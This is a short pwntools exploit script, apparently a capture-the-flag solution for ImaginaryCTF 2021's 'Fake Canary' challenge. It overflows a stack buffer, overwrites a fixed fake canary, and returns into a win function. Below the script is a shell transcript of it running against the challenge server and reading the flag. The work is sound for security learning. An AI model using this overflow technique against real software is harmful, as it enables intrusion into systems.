from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './fake_canary'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42002
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("What's your name?\n")

buf  = "A"*40
buf += p64(0xdeadbeef)
buf += "B"*8
buf += p64(0x400536)
buf += p64(elf.sym.win)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Fake_Canary_100$ python solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Fake_Canary_100/fake_canary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.imaginaryctf.org on port 42002: Done
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 16
-rw-r--r-- 1 nobody nogroup   41 Jul 23 16:32 flag.txt
-rwxr-xr-x 1 nobody nogroup 8560 Jul 23 16:32 run
$ cat flag.txt
ictf{m4ke_y0ur_canaries_r4ndom_f492b211}
'''
